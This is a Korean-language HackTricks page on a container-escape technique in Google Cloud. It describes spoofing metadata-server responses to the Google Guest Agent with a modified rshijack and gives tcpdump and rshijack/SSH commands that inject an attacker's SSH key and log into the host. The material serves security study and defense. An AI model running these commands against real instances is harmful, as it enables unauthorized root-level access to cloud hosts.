# GCP - 네트워크 Docker Escape

{{#include ../../../banners/hacktricks-training.md}}

## 초기 상태

이 기법이 명시된 두 개의 writeup 모두에서, 공격자는 GCP가 관리하는 **Docker** 컨테이너 내부에서 호스트 네트워크에 접근할 수 있는 상태에서 **root** 권한(및 권한 **`CAP_NET_ADMIN`** 및 **`CAP_NET_RAW`**)을 획득했습니다.

## 공격 설명

Google Compute Engine 인스턴스에서 네트워크 트래픽을 정기적으로 검사하면 `169.254.169.254`에 위치한 **metadata instance**로 향하는 수많은 **plain HTTP requests**가 보입니다. 오픈소스 서비스인 [**Google Guest Agent**](https://github.com/GoogleCloudPlatform/guest-agent)가 이러한 요청을 자주 보냅니다.

이 에이전트는 **metadata 변경을 모니터링**하도록 설계되었습니다. 특히, metadata에는 **SSH public keys를 위한 필드**가 포함되어 있습니다. 새로운 공개 SSH 키가 metadata에 추가되면, 에이전트는 이를 자동으로 `.authorized_key` 파일에 **권한 부여(authorize)** 합니다. 필요하면 **새 사용자 생성** 및 **sudoers**에 추가할 수도 있습니다.

에이전트는 **모든 metadata 값을 재귀적으로 가져오는 요청**(`GET /computeMetadata/v1/?recursive=true`)을 보내 변경을 모니터링합니다. 이 요청은 마지막으로 가져온 이후 metadata에 변경이 있을 때에만 메타데이터 서버가 응답하도록 설계되어 있으며, 변경 식별에는 Etag(`wait_for_change=true&last_etag=`)가 사용됩니다. 또한 **timeout** 파라미터(`timeout_sec=`)가 포함되어 있어, 지정된 timeout 내에 변경이 없으면 서버는 **변경 없는 값**을 반환합니다.

이 과정 때문에 **IMDS**(Instance Metadata Service)는 구성 변경이 없을 경우 **60초** 후에 응답할 수 있으며, 이로 인해 guest agent에게 전달될 가짜 구성 응답을 주입할 수 있는 잠재적인 **타임 윈도우**가 생깁니다.

공격자는 이를 이용해 **Man-in-the-Middle (MitM) attack**을 수행하여 IMDS 서버의 응답을 스푸핑하고 **새 공개 키를 삽입**할 수 있습니다. 이렇게 되면 호스트에 대한 무단 SSH 접근이 가능해질 수 있습니다.

### 탈출 기법

Google Compute Engine 네트워크에서는 ARP spoofing이 효과적이지 않지만, [**rshijack**의 수정된 버전](https://github.com/ezequielpereira/rshijack) (작성자: [**Ezequiel**](https://www.ezequiel.tech/2020/08/dropping-shell-in.html))을 사용하면 통신에 패킷 주입(packet injection)을 수행해 SSH 사용자를 주입할 수 있습니다.

이 rshijack 수정본은 ACK 및 SEQ 번호를 커맨드라인 인수로 입력할 수 있게 하여 실제 Metadata 서버 응답보다 먼저 응답을 스푸핑하는 것을 용이하게 합니다. 또한 [**작은 Shell 스크립트**](https://gist.github.com/ezequielpereira/914c2aae463409e785071213b059f96c#file-fakedata-sh)가 특수 제작된 페이로드를 반환하도록 사용됩니다. 이 페이로드는 Google Guest Agent가 `.authorized_keys` 파일에 지정된 공개 키로 **사용자 `wouter`를 생성**하도록 트리거합니다.

스크립트는 동일한 ETag를 사용해 Metadata 서버가 즉시 Google Guest Agent에 다른 metadata 값을 알리지 못하게 하여 응답을 지연시킵니다.

스푸핑을 실행하려면 다음 단계가 필요합니다:

1. **Metadata 서버로의 요청 모니터링**을 **tcpdump**로 수행:

<details>
<summary>tcpdump로 메타데이터 서버 요청 모니터링</summary>
```bash
tcpdump -S -i eth0 'host 169.254.169.254 and port 80' &
```
</details>

다음과 유사한 줄을 찾으세요:

<details>
<summary>tcpdump 출력 예시 줄</summary>
```
<TIME> IP <LOCAL_IP>.<PORT> > 169.254.169.254.80: Flags [P.], seq <NUM>:<TARGET_ACK>, ack <TARGET_SEQ>, win <NUM>, length <NUM>: HTTP: GET /computeMetadata/v1/?timeout_sec=<SECONDS>&last_etag=<ETAG>&alt=json&recursive=True&wait_for_change=True HTTP/1.1
```
</details>

2. 올바른 ETAG로 fake metadata 데이터를 rshijack에 전송합니다:

<details>
<summary>fake metadata를 전송하고 host에 SSH로 접속</summary>
```bash
fakeData.sh <ETAG> | rshijack -q eth0 169.254.169.254:80 <LOCAL_IP>:<PORT> <TARGET_SEQ> <TARGET_ACK>; ssh -i id_rsa -o StrictHostKeyChecking=no wouter@localhost
```
</details>

이 단계는 공개 키를 허가하여 해당 개인 키로 SSH 연결을 가능하게 합니다.

## References

- [https://www.ezequiel.tech/2020/08/dropping-shell-in.html](https://www.ezequiel.tech/2020/08/dropping-shell-in.html)
- [https://www.wiz.io/blog/the-cloud-has-an-isolation-problem-postgresql-vulnerabilities](https://www.wiz.io/blog/the-cloud-has-an-isolation-problem-postgresql-vulnerabilities)

{{#include ../../../banners/hacktricks-training.md}}
